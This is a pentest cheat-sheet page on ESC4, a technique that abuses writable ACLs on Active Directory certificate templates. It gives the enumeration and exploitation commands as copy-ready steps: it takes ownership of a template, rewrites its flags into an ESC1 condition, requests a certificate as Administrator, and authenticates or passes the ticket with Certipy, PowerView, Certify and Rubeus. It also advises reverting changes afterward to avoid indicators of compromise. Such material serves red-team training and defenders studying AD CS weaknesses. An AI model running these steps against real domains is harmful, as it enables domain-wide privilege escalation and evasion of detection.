# ESC4

{% hint style="info" %}
Overly permissive ACLs on templates
{% endhint %}

## Why It Works

* Certificate templates are themselves AD objects, each with their own ACL/DACL. If a low-privileged principal has a dangerous permission over a template object - `WriteOwner`, `WriteDacl`, `WriteProperty`/`GenericWrite`, or `GenericAll` - they can **modify the template's configuration** rather than needing it to already be vulnerable.
* A common attack path: take ownership (or grant yourself full control) of the template, then flip its settings to match ESC1 - set `ENROLLEE_SUPPLIES_SUBJECT`, add the Client Authentication EKU, remove manager-approval requirements, and grant yourself enrollment rights.
* Once weaponized, the template is exploited exactly like ESC1.
* This is essentially an **ACL-abuse primitive that lets an attacker manufacture an ESC1 condition** where none previously existed.

## Prerequisites

* `GenericAll`, `GenericWrite`, `WriteOwner`, or `WriteDacl` over a certificate template object (discoverable via BloodHound `WriteDacl`/`GenericAll` edges to template nodes, or Certipy's ACL output).

## Enumerate

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Look for '[!] Vulnerabilities' -> ESC4 flagged templates, and check the 'Permissions' section for writable ACEs held by your user/groups
```

## Exploit

{% tabs %}
{% tab title="Certipy" %}
```bash
## Overwrite the template's configuration to make it ESC1-exploitable (writes a vulnerable template config via LDAP)
certipy template -u <user>@<domain> -p <password> -dc-ip <DC-IP> -template <target-template> -save-old
## Now request a cert as Administrator (ESC1-style)
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <target-template> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
## Restore the original template config afterward (Certipy saved it with -save-old) to avoid leaving an obvious IOC
certipy template -u <user>@<domain> -p <password> -dc-ip <DC-IP> -template <target-template> -configuration <saved-config-file>
```
{% endtab %}

{% tab title="PowerView + Certify + Rubeus" %}
```powershell
## 1. Take ownership / grant yourself full control over the template object (PowerView)
Set-DomainObjectOwner -Identity '<target-template>' -OwnerIdentity '<controlled-user>'
Add-DomainObjectAcl -TargetIdentity '<target-template>' -PrincipalIdentity '<controlled-user>' -Rights All

## 2. Flip the template's flags to ESC1-style using the AD PowerShell module / ADSI
$template = Get-ADObject -Filter {cn -eq '<target-template>'} -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=com'
Set-ADObject -Identity $template -Replace @{'msPKI-Certificate-Name-Flag' = 1}   # ENROLLEE_SUPPLIES_SUBJECT

## 3. Request as Administrator (ESC1-style) and convert to pfx
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<target-template> /altname:administrator
openssl.exe pkcs12 -in esc4.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc4.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc4.pfx /ptt

## 4. Revert the template's ACL/flags afterward to reduce IOC footprint
```
{% endtab %}
{% endtabs %}
